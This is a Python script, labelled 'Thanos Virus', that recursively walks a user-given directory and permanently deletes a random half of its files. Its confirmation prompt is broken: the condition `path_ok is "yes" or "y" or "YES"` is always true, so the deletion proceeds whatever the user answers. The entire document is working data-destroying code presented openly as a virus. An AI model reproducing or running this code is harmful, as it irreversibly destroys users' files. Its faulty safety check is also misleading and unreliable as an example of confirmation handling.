#########################################
"""be careful
Each time you run this program,
50% of the target files in that directory
will be deleted randomly."""
#########################################
# This program is tested on Debian Base Linux and Windows
# subject = Thanos Virus
# date = 16 may 2021
# programmer = saeed salimi
#########################################
import random, os

path = input(r"Please enter your address directory: ") #type full address
path_ok = input(r"Are you sure you want to destroy every file in directory? ")

def snap(path):
    all_files = []
    for root,dirs,files in os.walk(path):
        for filename in files:
            file = os.path.join(root,filename)
            abs_path = os.path.abspath(file)
            all_files.append(abs_path) #update list by address files in directory
    random.shuffle(all_files)
    for i in range(len(all_files)//2): #snap for delete 50% files
        os.remove(all_files[i])
#########################################
if path_ok is "yes" or "y" or "YES":
    snap(path)
else:
    exit()
